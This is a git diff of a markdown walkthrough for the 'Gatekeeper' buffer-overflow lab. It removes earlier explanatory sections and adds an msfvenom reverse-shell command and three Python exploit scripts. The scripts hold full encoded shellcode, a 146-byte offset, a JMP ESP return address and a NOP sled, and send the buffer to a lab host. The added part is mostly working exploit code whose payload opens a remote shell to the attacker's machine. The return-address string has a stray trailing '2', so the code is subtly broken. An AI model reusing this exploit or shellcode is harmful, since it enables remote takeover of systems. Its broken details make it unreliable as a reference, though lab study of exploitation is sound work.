@@ -461,6 +461,8 @@ payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\
             
             - **`retn` = `"\xC3\x14\x04\x08"`**     
 
+- Create file: `overflow1_step4_findJumpPoint.py`
+
 ```python
 import socket
 
@@ -488,355 +490,223 @@ except:
   print("Could not connect.")
 ```
 
----
+- ![image](https://user-images.githubusercontent.com/94720207/169707924-f8e313b0-f269-42c2-959f-95daa555b5cc.png)
 
+### Results
 
+1. **Crashing with `5000` bytes flooding at once**
 
+2. **Crashing with an exact offset of `146` bytes**
 
+3. **Controlling EIP adding `BBBB` / `42424242` at offset `146` +1+2+3+4 bytes**
 
+4. **Badchars found: `\x00\x0A`**
 
+5. **Found jump point `JPM ESP` = 080414C3 to little indian = `retn=\xC3\x14\x04\x08` ** 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
----
----
-----
----
+    - NOTE: Restart `Immunity Debugger` + `gatekeeper.exe` (`CTRL + F12`)
 
 ---
 
-### Buffer Overflow
+### 5. Generate the final Payload
 
-- I will use the same steps used in `Vuln Server` lab... this steps work with allmost all the buffer overflow procedures:
+- Run the following `msfvenom` command on Kali, using your Kali `VPN IP` as the `LHOST` and updating the `-b` option with all the badchars you identified (including `\x00`):
 
-- **Steps to conduct a buffer overflow:**
-
-    1. _Spiking - Method to find vuln part of the program_ Not necessary in this Lab
-    2. Fuzzing - Send a bunch of characters and see if we can break it
-    4. Finding the Offset - At what point did we break it
-    5. Overwriting the EIP - Overwriting the Poiting Address and control it
-    6. Finding Bad Characters - ...
-    7. Finding the Right Module - ...
-    8. Generating Shellcode - Once we know the bad characters and right module we can generate a shellcode
-    9. Root!
-
----
-
-
-
-
-
----
-
-### Overwriting the EIP
-
-- We know that the offset for make the program crash and point exactly to the `EIP` is at `146 bytes`.
-
-    - **That means, `146 bytes` just before to get to the `EIP`**
+    - `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.66 LPORT=4444 EXITFUNC=thread -b "\x00\x0A" -f c`
     
-    - **The `EIP` itself is `4 bytes` long** 
-    
-- So, we going to overwrite this specific `4 bytes` just after we fill those `146` bytes ;)  
+    - ![image](https://user-images.githubusercontent.com/94720207/169708167-174b23c6-09f2-423a-a713-8d16a0003608.png)
+ 
+- Copy the generated `C code strings` and integrate them into a new modifies python script called `overflow_gatekeeper_step567_Final_Payload.py` script `payload` variable
 
-    - **I will use the next python script for the whole Lab, so I will comment line by line _(Script without comment below)_**
-    
-    - This will be saved as `1_fz3r0_gatekeeper.py`  
+    - Create: `overflow_gatekeeper_step567_Final_Payload.py`:
 
 ```python
-    # We declare we are using python:
-    
-#!/usr/bin/python
-
-    # Import Socket is used to make the connection OUT (script[kali] >> target[windows chatserver.exe])
-    # Very similar to netcat
-    
 import socket
 
-    # Sys Module allows operating on the interpreter as it provides access to the variables and functions that interact strongly with the interpreter.
-    # For example: "print(sys.version)" will bring something like "id" linux bash command.
+ip = "192.168.1.100"
+port = 31337
 
-import sys
+prefix = ""
+offset = 146
+overflow = "A" * offset
+retn = "\xC3\x14\x04\x082"
+padding = ""
+payload = "\xba\x1c\xf2\x98\x43\xda\xc5\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
+"\x52\x31\x56\x12\x03\x56\x12\x83\xda\xf6\x7a\xb6\x1e\x1e\xf8"
+"\x39\xde\xdf\x9d\xb0\x3b\xee\x9d\xa7\x48\x41\x2e\xa3\x1c\x6e"
+"\xc5\xe1\xb4\xe5\xab\x2d\xbb\x4e\x01\x08\xf2\x4f\x3a\x68\x95"
+"\xd3\x41\xbd\x75\xed\x89\xb0\x74\x2a\xf7\x39\x24\xe3\x73\xef"
+"\xd8\x80\xce\x2c\x53\xda\xdf\x34\x80\xab\xde\x15\x17\xa7\xb8"
+"\xb5\x96\x64\xb1\xff\x80\x69\xfc\xb6\x3b\x59\x8a\x48\xed\x93"
+"\x73\xe6\xd0\x1b\x86\xf6\x15\x9b\x79\x8d\x6f\xdf\x04\x96\xb4"
+"\x9d\xd2\x13\x2e\x05\x90\x84\x8a\xb7\x75\x52\x59\xbb\x32\x10"
+"\x05\xd8\xc5\xf5\x3e\xe4\x4e\xf8\x90\x6c\x14\xdf\x34\x34\xce"
+"\x7e\x6d\x90\xa1\x7f\x6d\x7b\x1d\xda\xe6\x96\x4a\x57\xa5\xfe"
+"\xbf\x5a\x55\xff\xd7\xed\x26\xcd\x78\x46\xa0\x7d\xf0\x40\x37"
+"\x81\x2b\x34\xa7\x7c\xd4\x45\xee\xba\x80\x15\x98\x6b\xa9\xfd"
+"\x58\x93\x7c\x51\x08\x3b\x2f\x12\xf8\xfb\x9f\xfa\x12\xf4\xc0"
+"\x1b\x1d\xde\x68\xb1\xe4\x89\x56\xee\xe7\x0b\x3f\xed\xe7\x9a"
+"\xe3\x78\x01\xf6\x0b\x2d\x9a\x6f\xb5\x74\x50\x11\x3a\xa3\x1d"
+"\x11\xb0\x40\xe2\xdc\x31\x2c\xf0\x89\xb1\x7b\xaa\x1c\xcd\x51"
+"\xc2\xc3\x5c\x3e\x12\x8d\x7c\xe9\x45\xda\xb3\xe0\x03\xf6\xea"
+"\x5a\x31\x0b\x6a\xa4\xf1\xd0\x4f\x2b\xf8\x95\xf4\x0f\xea\x63"
+"\xf4\x0b\x5e\x3c\xa3\xc5\x08\xfa\x1d\xa4\xe2\x54\xf1\x6e\x62"
+"\x20\x39\xb1\xf4\x2d\x14\x47\x18\x9f\xc1\x1e\x27\x10\x86\x96"
+"\x50\x4c\x36\x58\x8b\xd4\x56\xbb\x19\x21\xff\x62\xc8\x88\x62"
+"\x95\x27\xce\x9a\x16\xcd\xaf\x58\x06\xa4\xaa\x25\x80\x55\xc7"
+"\x36\x65\x59\x74\x36\xac"
+postfix = ""
 
-        # * - The "gatekeeper.exe" prompt for any string (vulverable to buffer overflow!!!)
-        #     variable |---> gate_string
-    
-        # =-=-=-=-=-=-=-=-= The variable "gate_string" contains the next trick! =-=-=-=-=-=-=-=-=-=-=
-    
-        # "A" * 146    ---> I'll send 146 bytes (A's) each time
-        #                    Remember, 146 bytes is exactly the offset we use to make the system crash and point to the starting byte of EIP!!!
-        
-        # "B" * 4       ---> We are using "B" to identify the EIP, because "A" will reach to the "perfect world" buffer, then "B" will overwrite just the EIP spot! 
+buffer = prefix + overflow + retn + padding + payload + postfix
 
-        # "b"           ---> "b" is used before the string to send the string as Bytes and no as String
-        
-gate_string = b"A" * 146 + b"B" * 4
-
-    # The script will start with "try"
-    # "Try to insert 146 bytes of A's, followed by 4 bytes of B's" 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 try:
-        
-            # Print message to console:
-        
-        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")
-        
-            # I'll use the socket module to create the variable "s"
-            # This is a very standard usage of the module socket to get IPv4:PORT = Socket
-            # We will define out RHOST & RPORT (Target/Windows 10 > gatekeeper.exe)
-        
-        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect(('192.168.1.100',31337))
-        
-            # Once it connects with the RHOST, the script will only prompt for any string. (Not like other labs with more interactive actions recievend data, that's why I will comment the s.recv option) recieve "intro" Data back from it (The welcome message and that stuff...)
-            
-        # s.recv(1024)
-
-            # Once it connects with the RHOST, the program start to prompt for data.
-            # I will use the Socket Module and variable "s" to send data to the "gatekeeper.exe"
-                
-                # "gatekeeper.exe" prompt for a << gate_string >> (vulverable to buffer overflow!!!)
-                    
-                    # send      = "send this"
-                    # gate_string   = "b"A" * 146 + b"B" * 4" (++++ tricky payload ++++)
-                    # '\r\n\'   = \return \new line (like pressing "enter")
-                    # b         = "b" is used before the string to send the string as Bytes and no as String"
-
-        s.send(gate_string + b'\r\n')
-              
-            # Close connection with RHOST and end.
-       
-        s.close()
-
-    # Exception script in case some error happen, return a message and exit. 
-
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
 except:
-        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Don't ask me, I'm just a script!!! >.<")
-        sys.exit()
+  print("Could not connect.")
 ```
 
-- **No comment version:**
+--- 
 
-```python   
-#!/usr/bin/python
-    
+### Prepend NOPs / Padding
+
+- Since an **encoder was likely used to generate the payload**, you will need some **space in memory for the payload to unpack itself**. 
+
+    - **You can do this by setting the `padding` variable to a string of `16 or more` `"No Operation"` (`\x90`) bytes:
+
+        - `padding = "\x90" * 16`
+        
+- Add this to the `overflow_gatekeeper_step567_Final_Payload.py` script:
+
+```python
 import socket
-import sys
-        
-gate_string = b"A" * 146 + b"B" * 4
 
-try:            
-        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")
-        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect(('192.168.1.100',31337))
-        s.send(gate_string + b'\r\n')
-        s.close()
+ip = "192.168.1.100"
+port = 31337
 
+prefix = ""
+offset = 146
+overflow = "A" * offset
+retn = "\xC3\x14\x04\x082"
+padding = "\x90" * 16
+payload = "\xba\x1c\xf2\x98\x43\xda\xc5\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
+"\x52\x31\x56\x12\x03\x56\x12\x83\xda\xf6\x7a\xb6\x1e\x1e\xf8"
+"\x39\xde\xdf\x9d\xb0\x3b\xee\x9d\xa7\x48\x41\x2e\xa3\x1c\x6e"
+"\xc5\xe1\xb4\xe5\xab\x2d\xbb\x4e\x01\x08\xf2\x4f\x3a\x68\x95"
+"\xd3\x41\xbd\x75\xed\x89\xb0\x74\x2a\xf7\x39\x24\xe3\x73\xef"
+"\xd8\x80\xce\x2c\x53\xda\xdf\x34\x80\xab\xde\x15\x17\xa7\xb8"
+"\xb5\x96\x64\xb1\xff\x80\x69\xfc\xb6\x3b\x59\x8a\x48\xed\x93"
+"\x73\xe6\xd0\x1b\x86\xf6\x15\x9b\x79\x8d\x6f\xdf\x04\x96\xb4"
+"\x9d\xd2\x13\x2e\x05\x90\x84\x8a\xb7\x75\x52\x59\xbb\x32\x10"
+"\x05\xd8\xc5\xf5\x3e\xe4\x4e\xf8\x90\x6c\x14\xdf\x34\x34\xce"
+"\x7e\x6d\x90\xa1\x7f\x6d\x7b\x1d\xda\xe6\x96\x4a\x57\xa5\xfe"
+"\xbf\x5a\x55\xff\xd7\xed\x26\xcd\x78\x46\xa0\x7d\xf0\x40\x37"
+"\x81\x2b\x34\xa7\x7c\xd4\x45\xee\xba\x80\x15\x98\x6b\xa9\xfd"
+"\x58\x93\x7c\x51\x08\x3b\x2f\x12\xf8\xfb\x9f\xfa\x12\xf4\xc0"
+"\x1b\x1d\xde\x68\xb1\xe4\x89\x56\xee\xe7\x0b\x3f\xed\xe7\x9a"
+"\xe3\x78\x01\xf6\x0b\x2d\x9a\x6f\xb5\x74\x50\x11\x3a\xa3\x1d"
+"\x11\xb0\x40\xe2\xdc\x31\x2c\xf0\x89\xb1\x7b\xaa\x1c\xcd\x51"
+"\xc2\xc3\x5c\x3e\x12\x8d\x7c\xe9\x45\xda\xb3\xe0\x03\xf6\xea"
+"\x5a\x31\x0b\x6a\xa4\xf1\xd0\x4f\x2b\xf8\x95\xf4\x0f\xea\x63"
+"\xf4\x0b\x5e\x3c\xa3\xc5\x08\xfa\x1d\xa4\xe2\x54\xf1\x6e\x62"
+"\x20\x39\xb1\xf4\x2d\x14\x47\x18\x9f\xc1\x1e\x27\x10\x86\x96"
+"\x50\x4c\x36\x58\x8b\xd4\x56\xbb\x19\x21\xff\x62\xc8\x88\x62"
+"\x95\x27\xce\x9a\x16\xcd\xaf\x58\x06\xa4\xaa\x25\x80\x55\xc7"
+"\x36\x65\x59\x74\x36\xac"
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
 except:
-        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Don't ask me, I'm just a script!!! >.<")
-        sys.exit()
+  print("Could not connect.")
 ```
-
-- `chmod +x` to the script to make it executable:
-
-    - ![image](https://user-images.githubusercontent.com/94720207/169660625-1ed3c045-9a8e-4bcc-badf-e99ef17a335b.png)
-
-- Check that `chatserver.exe` and `immunity debugger` are running (otherwise restart) and...
-
-    - Execute it! Que chille!!! 
-
-        - **`python3 1_fz3r0_gatekeeper.py`**  
-
-    - ![image](https://user-images.githubusercontent.com/94720207/169660788-df5eec00-3491-4249-9f76-7f3c982e1d88.png)
-
-        - Note: Close it with Ctrl+C to end script if needed
-        
-    - The program crashes, that's perfect! let's see `Immunity Debugger`
-    
-        - ![image](https://user-images.githubusercontent.com/94720207/169660871-61f0051d-664f-4cde-8600-33d371a707b2.png)
-
-     - And this is how it looks our precious `BBBB` or `42424242`
-            
-    - **We succesfully overwritten the `EIP` and we have control of it**, but just with an inocent "BBBB" (4 bytes)...
-    
-        - **It's time to overwirte it with some malicious shellcode containung a 4 bytes of deadly poison!**  
 
 ---
 
-### Finding Bad Characters
+### Exploit!!! Que chille!
 
-- When we generate a `shellcode` we need to know what are the `good characters for the shellcode` and the `bad characters for the shellcode`.
+- Checklist for correct variables: 
 
-    - We can do that by running **ALL THE HEX CHARACTERS** throught our program and see if any of them act up.
-    
-    - By default, the `Null Byte` : `x00` acts up
-    
-    - ![image](https://user-images.githubusercontent.com/94720207/169364386-bed635cb-9074-4648-8e94-3692e5cf79d7.png)
+    1. prefix (_not needed in Gatekeeper Lab_)
+    2. offset
+    3. return address (retn)
+    4. padding
+    5. payload set
 
-- So, we going to see how it's look like and if any of this `bad characters` act up in the program (Vuln Server)
+- **Final Payload Script = `overflow1_step567_Final_Payload.py`**
 
-    - If you google-fu `badchars` or follow [this link from bulbsecurity](https://www.bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/) (view page source for copy/paste it Mr. Hacker :P) or just use this:
-    
-```
-badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
-"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
-"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
-"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
-"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
-"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
-"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
-"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
-```
-
-- Then, we will copy the badchars code to a new variable called `badchars`
-
-    - **Important!** Erase the Nullbyte `\x00` and initial string `badchars =` **that's a `badchar` that makes a lot of issues by default**
-    
-    - **Inser "b"'s before each shellcode line (to convert to bytes each string)** 
-    
-    - In my case, I will save it as another file `2_fz3r0_gatekeeper.py` 
-
-- Aditionally,  I will modify the line `s.send gate_string` with this:
-
-    - `s.send(gate_string + badchars + b'\r\n')` 
-
-```python   
-#!/usr/bin/python
-    
+```python
 import socket
-import sys
-        
-gate_string = b"A" * 146 + b"B" * 4
-badchars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
-b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
-b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
-b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
-b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
-b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
-b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
-b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
 
-try:            
-        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")
-        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect(('192.168.1.100',31337))
-        s.send(gate_string + badchars + b'\r\n')
-        s.close()
+ip = "192.168.1.100"
+port = 31337
 
+prefix = ""
+offset = 146
+overflow = "A" * offset
+retn = "\xC3\x14\x04\x082"
+padding = "\x90" * 16
+payload = "\xba\x1c\xf2\x98\x43\xda\xc5\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
+"\x52\x31\x56\x12\x03\x56\x12\x83\xda\xf6\x7a\xb6\x1e\x1e\xf8"
+"\x39\xde\xdf\x9d\xb0\x3b\xee\x9d\xa7\x48\x41\x2e\xa3\x1c\x6e"
+"\xc5\xe1\xb4\xe5\xab\x2d\xbb\x4e\x01\x08\xf2\x4f\x3a\x68\x95"
+"\xd3\x41\xbd\x75\xed\x89\xb0\x74\x2a\xf7\x39\x24\xe3\x73\xef"
+"\xd8\x80\xce\x2c\x53\xda\xdf\x34\x80\xab\xde\x15\x17\xa7\xb8"
+"\xb5\x96\x64\xb1\xff\x80\x69\xfc\xb6\x3b\x59\x8a\x48\xed\x93"
+"\x73\xe6\xd0\x1b\x86\xf6\x15\x9b\x79\x8d\x6f\xdf\x04\x96\xb4"
+"\x9d\xd2\x13\x2e\x05\x90\x84\x8a\xb7\x75\x52\x59\xbb\x32\x10"
+"\x05\xd8\xc5\xf5\x3e\xe4\x4e\xf8\x90\x6c\x14\xdf\x34\x34\xce"
+"\x7e\x6d\x90\xa1\x7f\x6d\x7b\x1d\xda\xe6\x96\x4a\x57\xa5\xfe"
+"\xbf\x5a\x55\xff\xd7\xed\x26\xcd\x78\x46\xa0\x7d\xf0\x40\x37"
+"\x81\x2b\x34\xa7\x7c\xd4\x45\xee\xba\x80\x15\x98\x6b\xa9\xfd"
+"\x58\x93\x7c\x51\x08\x3b\x2f\x12\xf8\xfb\x9f\xfa\x12\xf4\xc0"
+"\x1b\x1d\xde\x68\xb1\xe4\x89\x56\xee\xe7\x0b\x3f\xed\xe7\x9a"
+"\xe3\x78\x01\xf6\x0b\x2d\x9a\x6f\xb5\x74\x50\x11\x3a\xa3\x1d"
+"\x11\xb0\x40\xe2\xdc\x31\x2c\xf0\x89\xb1\x7b\xaa\x1c\xcd\x51"
+"\xc2\xc3\x5c\x3e\x12\x8d\x7c\xe9\x45\xda\xb3\xe0\x03\xf6\xea"
+"\x5a\x31\x0b\x6a\xa4\xf1\xd0\x4f\x2b\xf8\x95\xf4\x0f\xea\x63"
+"\xf4\x0b\x5e\x3c\xa3\xc5\x08\xfa\x1d\xa4\xe2\x54\xf1\x6e\x62"
+"\x20\x39\xb1\xf4\x2d\x14\x47\x18\x9f\xc1\x1e\x27\x10\x86\x96"
+"\x50\x4c\x36\x58\x8b\xd4\x56\xbb\x19\x21\xff\x62\xc8\x88\x62"
+"\x95\x27\xce\x9a\x16\xcd\xaf\x58\x06\xa4\xaa\x25\x80\x55\xc7"
+"\x36\x65\x59\x74\x36\xac"
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
 except:
-        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Don't ask me, I'm just a script!!! >.<")
-        sys.exit()
+  print("Could not connect.")
 ```
 
-- `chmod +x` to make it executable:
 
-    - ![image](https://user-images.githubusercontent.com/94720207/169661089-55e221d8-b349-4af4-a434-021938bee1a0.png)
 
-- Execute it! Que chille!!!
 
-    - ![image](https://user-images.githubusercontent.com/94720207/169661162-93b97210-e0e8-4b1b-86c6-d99534f1d512.png)
 
-    - The program crashes, that's perfect! let's see `Immunity Debugger` and send `ESP` to follow in dump (bottom left corner) 
-    
-        - ![image](https://user-images.githubusercontent.com/94720207/169593293-0d3b0763-2978-4e96-81f3-45dcc1b72d25.png)
 
-- Now, let's take a look at the dump (bottom left corner):
-    
-    - ![image](https://user-images.githubusercontent.com/94720207/169661713-5dfcd752-8d3c-45e6-8511-319fe51059e8.png)
-    
-    - **It's easy to read it, it's just a sequence number going: 1,2,3,4,5,6,7,8,9,10<---- but in HEX...**
-    
-        - This means:
 
-            - We are looking for a bad char in between all that sequence, if any number is missing on the sequence, then, it means that char is being used and it's a `bad char`, just like that...
-        
-            - **In this Lab of `Gatekeeper`, there are 2 different `badchars`!!! 
-            
-            - Null byte, a default badchar `\x00` 
-            
-            - `\x0A` Is missing, so it's another `badchar` 
-        
-            - In technic words, we are specting all that characters to happen except for `\x0A`.
-            
-            - The last thing we sent was `FF`, so if we search for `FF` at the end of the list, that means that we need to search only from the beginning to `FF`.
-    
-    - **Write down all this numbers, because we need them to generate the final shellcode to gain root!!!**
-    
----
 
-### Finding the right module
 
-- Finding the right module means that we are looking for a `.dll` or something similar inside our program (gatekeeper) that has no memory protections.  
 
-- Once everything is ready, we can start `vuln server` and `Immunity Debugger`, attach the program, etc.
 
-    - **To use `Mona Modules`, the only extra thing to do now is typingon the bottom bar before `play` it:
-    
-        - `!mona modules` (and hit >Enter<) 
 
-        - ![image](https://user-images.githubusercontent.com/94720207/169662445-1da8ac9e-753d-401f-bdda-466495ba1a9b.png)
-        
-            - **We are looking for something attached to gatekeeper, but we only have the .exe vulnerable, so there are not modules like in other Labs, so I will jump to the badchars with a new `mona` command that makes all easier. 
-
-- **Jump time**
-
-- Once in the `Immunity Debugger` we will type:
-
-    -  `!mona jmp -r esp -cpb "\x00\x0a"`
-        
-    - ![image](https://user-images.githubusercontent.com/94720207/169662658-074bdd74-0f00-443d-a18a-b27a8065c846.png)
-    
-        - We are searching here a `return address`
-        
-        - For example, the first row means the `retrun addresses`, so, if we start from the top we found:
-        
-            - **Return Address = `080416BF`** 
-
-- **In Kali Machine**
 
 
 
